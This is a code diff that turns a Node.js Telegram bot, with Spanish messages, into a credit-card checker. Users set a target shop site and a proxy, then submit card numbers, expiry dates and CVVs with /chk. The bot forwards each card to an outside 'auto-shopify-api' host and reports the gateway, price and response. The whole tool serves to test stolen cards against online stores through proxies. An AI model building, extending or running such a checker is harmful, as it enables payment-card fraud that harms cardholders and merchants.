@@ -1,34 +1,19 @@
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
-const fs = require('fs');
+const axios = require('axios');
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const OWNER_ID = Number(process.env.OWNER_ID);
+const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';
 
 if (!BOT_TOKEN) {
-  console.error('BOT_TOKEN missing');
+  console.error('BOT_TOKEN no definido');
   process.exit(1);
 }
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-/* ================= DATA ================= */
-const DATA_FILE = './data.json';
-let data = { sites: [], proxies: [] };
-
-if (fs.existsSync(DATA_FILE)) {
-  data = JSON.parse(fs.readFileSync(DATA_FILE));
-} else {
-  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
-}
-
-function saveData() {
-  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
-}
-
-function isOwner(id) {
-  return id === OWNER_ID;
-}
+// memoria simple por chat
+const config = {}; // chatId => { site, proxy }
 
 /* ================= START ================= */
 bot.onText(/\/start/, (msg) => {
@@ -36,77 +21,80 @@ bot.onText(/\/start/, (msg) => {
     msg.chat.id,
 `🤖 Bot activo
 
-🌐 Sites: ${data.sites.length}
-🧰 Proxies: ${data.proxies.length}
+Configura primero:
+• /setsite https://site.com
+• /setproxy ip:port:user:pass
 
-Comandos:
-• /addsites
-• /listsites
-• /clearsites
-
-• /addproxies
-• /listproxies
-• /clearproxies
-
-• /stop`
+Luego usa:
+• /chk cc|mm|yy|cvv
+• varios CC (uno por línea)`
   );
 });
 
-/* ================= SITES ================= */
-bot.onText(/\/addsites/, (msg) => {
-  if (!isOwner(msg.from.id)) return;
-  bot.sendMessage(msg.chat.id, 'Envía los sites (uno por línea):');
+/* ================= SET SITE ================= */
+bot.onText(/\/setsite (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  config[chatId] = config[chatId] || {};
+  config[chatId].site = match[1].trim();
 
-  bot.once('message', (m) => {
-    const lines = m.text.split('\n').map(x => x.trim()).filter(Boolean);
-    data.sites.push(...lines);
-    saveData();
-    bot.sendMessage(msg.chat.id, `Sites agregados: ${lines.length}`);
-  });
+  bot.sendMessage(chatId, `✅ Site guardado:\n${config[chatId].site}`);
 });
 
-bot.onText(/\/listsites/, (msg) => {
-  if (!isOwner(msg.from.id)) return;
-  if (!data.sites.length) return bot.sendMessage(msg.chat.id, 'No hay sites');
-  bot.sendMessage(msg.chat.id, data.sites.join('\n'));
+/* ================= SET PROXY ================= */
+bot.onText(/\/setproxy (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  config[chatId] = config[chatId] || {};
+  config[chatId].proxy = match[1].trim();
+
+  bot.sendMessage(chatId, `✅ Proxy guardado`);
 });
 
-bot.onText(/\/clearsites/, (msg) => {
-  if (!isOwner(msg.from.id)) return;
-  data.sites = [];
-  saveData();
-  bot.sendMessage(msg.chat.id, 'Sites eliminados');
+/* ================= CHK ================= */
+bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const conf = config[chatId];
+
+  if (!conf || !conf.site || !conf.proxy) {
+    return bot.sendMessage(
+      chatId,
+      '❌ Falta configuración\nUsa /setsite y /setproxy'
+    );
+  }
+
+  let input = match[1].trim();
+  if (!input) {
+    return bot.sendMessage(chatId, '❌ No enviaste CC');
+  }
+
+  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
+
+  bot.sendMessage(chatId, `⏳ Procesando ${ccs.length} check(s)...`);
+
+  for (let i = 0; i < ccs.length; i++) {
+    const cc = ccs[i];
+
+    const url =
+      `${API_BASE}?site=${encodeURIComponent(conf.site)}` +
+      `&cc=${encodeURIComponent(cc)}` +
+      `&proxy=${encodeURIComponent(conf.proxy)}`;
+
+    try {
+      const res = await axios.get(url, { timeout: 30000 });
+      const d = res.data;
+
+      const msgTxt =
+        `━━━━━━━━━━━━━━\n` +
+        `🧪 CHK ${i + 1}\n` +
+        `💳 ${cc}\n` +
+        `🏪 ${d.Gateway}\n` +
+        `💰 ${d.Price}\n` +
+        `📤 ${d.Response}`;
+
+      bot.sendMessage(chatId, msgTxt);
+    } catch (e) {
+      bot.sendMessage(chatId, `❌ Error en CHK ${i + 1}`);
+    }
+  }
 });
 
-/* ================= PROXIES ================= */
-bot.onText(/\/addproxies/, (msg) => {
-  if (!isOwner(msg.from.id)) return;
-  bot.sendMessage(msg.chat.id, 'Envía los proxies (uno por línea):');
-
-  bot.once('message', (m) => {
-    const lines = m.text.split('\n').map(x => x.trim()).filter(Boolean);
-    data.proxies.push(...lines);
-    saveData();
-    bot.sendMessage(msg.chat.id, `Proxies agregados: ${lines.length}`);
-  });
-});
-
-bot.onText(/\/listproxies/, (msg) => {
-  if (!isOwner(msg.from.id)) return;
-  if (!data.proxies.length) return bot.sendMessage(msg.chat.id, 'No hay proxies');
-  bot.sendMessage(msg.chat.id, data.proxies.join('\n'));
-});
-
-bot.onText(/\/clearproxies/, (msg) => {
-  if (!isOwner(msg.from.id)) return;
-  data.proxies = [];
-  saveData();
-  bot.sendMessage(msg.chat.id, 'Proxies eliminados');
-});
-
-/* ================= STOP ================= */
-bot.onText(/\/stop/, (msg) => {
-  bot.sendMessage(msg.chat.id, 'Proceso detenido');
-});
-
-console.log('Bot iniciado correctamente');
+console.log('🤖 Bot iniciado correctamente');
